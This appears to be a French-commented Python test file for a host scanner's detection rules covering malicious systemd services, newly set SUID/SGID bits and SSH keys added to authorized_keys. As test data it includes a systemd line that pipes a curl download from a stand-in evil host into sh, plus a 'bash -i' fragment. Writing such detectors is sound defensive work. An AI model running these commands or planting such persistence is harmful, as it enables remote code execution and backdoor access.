"""Tests pour SIG-0017, SIG-0018, SIG-0019 et la nouvelle interface RuleContext."""

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from sentinel.models import RuleContext
from sentinel.signatures import Sig0017, Sig0018, Sig0019

FIX = Path(__file__).resolve().parents[1] / "tests" / "fixtures" / "sig"


class TestRuleContext(unittest.TestCase):
    """L'interface Rule.scan doit accepter un RuleContext optionnel sans casser
    les règles existantes."""

    def test_scan_works_without_context(self) -> None:
        # Un test minimal : Sig0017 doit être utilisable sans contexte.
        rule = Sig0017()
        # Fichier non systemd : aucun finding attendu.
        findings = list(rule.scan("hello.txt", "echo hi\n", context=None))
        self.assertEqual(findings, [])

    def test_scan_works_with_empty_context(self) -> None:
        rule = Sig0017()
        # Fichier non systemd.
        findings = list(rule.scan("hello.txt", "echo hi\n", context=RuleContext()))
        self.assertEqual(findings, [])


class TestSig0017Systemd(unittest.TestCase):
    def test_detects_malicious_execstart_reverse_shell(self) -> None:
        text = (FIX.parent / "v4" / "backdoor.service").read_text()
        rule = Sig0017()
        findings = list(rule.scan("backdoor.service", text))
        # Au moins un finding ExecStart malveillant.
        self.assertGreaterEqual(len(findings), 1)
        self.assertTrue(all(f.rule_id == "SIG-0017" for f in findings))
        self.assertTrue(all(f.severity == "critical" for f in findings))

    def test_ignores_benign_service(self) -> None:
        text = (FIX.parent / "v4" / "myapp.service").read_text()
        rule = Sig0017()
        findings = list(rule.scan("myapp.service", text))
        self.assertEqual(findings, [])

    def test_ignores_non_service_files(self) -> None:
        rule = Sig0017()
        # Texte qui contient "ExecStart=bash -i" mais dans un fichier .py
        findings = list(rule.scan("script.py", "ExecStart=bash -i\n"))
        self.assertEqual(findings, [])

    def test_detects_curl_pipe_to_sh(self) -> None:
        rule = Sig0017()
        text = "[Service]\nExecStart=curl -fsSL http://evil.example/x | sh\n"
        findings = list(rule.scan("evil.service", text))
        self.assertEqual(len(findings), 1)


class TestSig0018SuidSgid(unittest.TestCase):
    def test_no_suid_no_finding(self) -> None:
        rule = Sig0018()
        findings = list(
            rule.scan(
                "/usr/bin/some-tool",
                "binary content here",
                context=RuleContext(file_mode=0o100755, baseline_mode=0o100755),
            )
        )
        self.assertEqual(findings, [])

    def test_suid_new_finding(self) -> None:
        rule = Sig0018()
        # Le fichier vient d'apparaître avec SUID (file_mode a SUID, pas de baseline)
        findings = list(
            rule.scan(
                "/usr/bin/suspicious",
                "binary",
                context=RuleContext(file_mode=0o104755, baseline_mode=None),
            )
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].rule_id, "SIG-0018")
        self.assertEqual(findings[0].severity, "high")

    def test_suid_added_in_modification(self) -> None:
        rule = Sig0018()
        # Le fichier existait en 0o755, maintenant en 0o4755 (SUID ajouté)
        findings = list(
            rule.scan(
                "/usr/bin/legit",
                "binary",
                context=RuleContext(file_mode=0o104755, baseline_mode=0o100755),
            )
        )
        self.assertEqual(len(findings), 1)
        self.assertIn("SUID", findings[0].message or findings[0].evidence)

    def test_sgid_added_finding(self) -> None:
        rule = Sig0018()
        findings = list(
            rule.scan(
                "/usr/bin/legit",
                "binary",
                context=RuleContext(file_mode=0o102755, baseline_mode=0o100755),
            )
        )
        self.assertEqual(len(findings), 1)


class TestSig0019AuthorizedKeysAugment(unittest.TestCase):
    def test_no_baseline_no_finding(self) -> None:
        rule = Sig0019()
        findings = list(
            rule.scan(
                "authorized_keys",
                "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAA user@host\n",
                context=RuleContext(baseline_text=None),
            )
        )
        # Sans baseline, on ne peut pas dire « augmentée » — donc pas de finding.
        self.assertEqual(findings, [])

    def test_baseline_with_no_new_keys_no_finding(self) -> None:
        rule = Sig0019()
        baseline = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAA user@host\n"
        current = baseline
        findings = list(
            rule.scan(
                "authorized_keys",
                current,
                context=RuleContext(baseline_text=baseline),
            )
        )
        self.assertEqual(findings, [])

    def test_baseline_with_new_key_finding(self) -> None:
        rule = Sig0019()
        baseline = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAA old@host\n"
        current = baseline + "ssh-ed25519 BBBBC3NzaC1lZDI1NTE5AAAAIBBB new@host\n"
        findings = list(
            rule.scan(
                "authorized_keys",
                current,
                context=RuleContext(baseline_text=baseline),
            )
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].rule_id, "SIG-0019")
        self.assertEqual(findings[0].severity, "high")

    def test_only_ed25519_keys_count(self) -> None:
        """P0-6 : SIG-0019 déclenche sur TOUS types de clés SSH (ed25519,
        rsa, dss, ecdsa) ajoutées post-baseline — plus seulement ed25519.

        SIG-0007 reste l'audit générique « n'importe quelle clé existe » ;
        SIG-0019 reste l'audit « clé ajoutée depuis la baseline » (sémantique
        distincte, pas de double-emploi).
        """
        rule = Sig0019()
        baseline = "ssh-rsa AAAAB3NzaC1yc2EAAAA old@host\n"
        # On ajoute une clé RSA, pas ed25519 — doit être détectée.
        current = baseline + "ssh-rsa CCCCB3NzaC1yc2EAAA new@host\n"
        findings = list(
            rule.scan(
                "authorized_keys",
                current,
                context=RuleContext(baseline_text=baseline),
            )
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].rule_id, "SIG-0019")
        self.assertIn("ssh-rsa", findings[0].evidence)

    def test_ignores_non_authorized_keys_files(self) -> None:
        rule = Sig0019()
        baseline = "ssh-ed25519 AAAA\n"
        current = baseline + "ssh-ed25519 BBBB\n"
        findings = list(
            rule.scan(
                "config",  # pas un authorized_keys
                current,
                context=RuleContext(baseline_text=baseline),
            )
        )
        self.assertEqual(findings, [])


if __name__ == "__main__":
    unittest.main()
